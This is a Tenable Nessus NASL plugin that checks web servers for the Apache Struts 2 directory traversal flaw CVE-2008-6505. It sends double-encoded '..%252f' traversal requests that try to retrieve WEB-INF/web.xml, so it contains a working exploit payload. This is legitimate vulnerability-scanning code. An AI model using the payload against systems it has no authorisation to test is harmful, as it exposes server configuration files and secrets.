#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(34946);
  script_version("1.23");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/04/11");

  script_cve_id("CVE-2008-6505");
  script_bugtraq_id(32104);
  script_xref(name:"SECUNIA", value:"32497");

  script_name(english:"Apache Struts 2 < 2.0.12 / 2.1.3 Dispatcher Directory Traversal");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a Java framework that is affected by
a directory traversal vulnerability.");
  script_set_attribute(attribute:"description", value:
"The remote web server is using Apache Struts, a web application
framework for developing Java EE web applications.

The version of Apache Struts 2 installed on the remote host fails to
properly decode and normalize the request path before serving static
content. Using double-encoded directory traversal sequences, an
anonymous remote attacker can leverage this issue to download files
outside the static content folder.");
  script_set_attribute(attribute:"see_also", value:"https://issues.apache.org/jira/browse/WW-2779");
  script_set_attribute(attribute:"see_also", value:"http://struts.apache.org/docs/s2-004.html");
  script_set_attribute(attribute:"solution", value:
"Upgrade to Struts 2.0.12 / 2.1.3 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:P/RL:O/RC:C");
  script_set_attribute(attribute:"cvss_score_source", value:"CVE-2008-6505");

  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"false");
  script_cwe_id(22);

  script_set_attribute(attribute:"vuln_publication_date", value:"2008/08/21");
  script_set_attribute(attribute:"patch_publication_date", value:"2008/08/21");
  script_set_attribute(attribute:"plugin_publication_date", value:"2008/11/24");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:apache:struts");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2022 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("webmirror.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80, 8080);

  exit(0);
}

include("http.inc");
include("data_protection.inc");

port = get_http_port(default:8080);

file = 'WEB-INF/web.xml';
file_pat = "^<web-app +id=";

cgis = get_kb_list('www/' + port + '/cgi');

urls = make_list();
# To identify actions that we can test the exploit on we will look
# for files with the .action / .jsp  / .do suffix from the KB.
if (!isnull(cgis))
{
  foreach cgi (cgis)
  {
    match = pregmatch(pattern:"((^.*)(/.+\.act(ion)?)($|\?|;))", string:cgi);
    if (match)
    {
      urls = make_list(urls, match[0]);
      if (!thorough_tests) break;
    }
    match2 = pregmatch(pattern:"(^.*)(/.+\.jsp)$", string:cgi);
    if (!isnull(match2))
    {
      urls = make_list(urls, match2[0]);
      if (!thorough_tests) break;
    }
    match3 = pregmatch(pattern:"(^.*)(/.+\.do)$", string:cgi);
    if (!isnull(match3))
    {
      urls = make_list(urls, match3[0]);
      if (!thorough_tests) break;
    }
    if (cgi =~ "struts2?(-rest)?-showcase")
    {
      urls = make_list(urls, cgi);
      if (!thorough_tests) break;
    }
  }
}
if (thorough_tests)
{
  cgi2 = get_kb_list('www/' + port + '/content/extensions/act*');
  if (!isnull(cgi2)) urls = make_list(urls, cgi2);

  cgi3 = get_kb_list('www/' + port + '/content/extensions/jsp');
  if (!isnull(cgi3)) urls = make_list(urls, cgi3);

  cgi4 = get_kb_list('www/' + port + '/content/extensions/do');
  if (!isnull(cgi4)) urls = make_list(urls, cgi4);
}

# Always check web root
urls = make_list(urls, "/");

# Struts is slow
timeout = get_read_timeout() * 2;
if(timeout < 10)
  timeout = 10;
http_set_read_timeout(timeout);

urls = list_uniq(urls);

foreach dir (urls)
{
  # Strip the filename and extensions so we have only the directory
  dir = ereg_replace(
    pattern : "(/[^/]+\.(act(ion)?|do|jsp)($|\?|;))",
    string  : dir,
    replace : ""
  );

  # Identify a web app using Struts.
  res = http_send_recv3(
    port   : port,
    method : "GET",
    item   : dir + "/struts/webconsole.html",
    exit_on_fail : TRUE
  );

  # If so...
  if (">OGNL Console<" >< res[2])
  {
    for (levels=3; levels<8; levels++)
    {
      exploit = "/struts/" + crap(data:"..%252f", length:7*levels) + file;
      url = dir + exploit;

      res = http_send_recv3(
        port   : port,
        method : "GET",
        item   : url,
        exit_on_fail : TRUE
      );

      # There's a problem if we get the file we're looking for.
      if (egrep(pattern:file_pat, string:res[2]))
      {
        security_report_v4(
          port        : port,
          severity    : SECURITY_WARNING,
          file        : file,
          request     : make_list(build_url(qs:url, port:port)),
          output      : data_protection::sanitize_user_full_redaction(output:chomp(res[2])),
          attach_type : 'text/plain'
        );
        exit(0);
      }
    }
  }
}
exit(0, 'No vulnerable applications were detected on the web server listening on port '+port+'.');
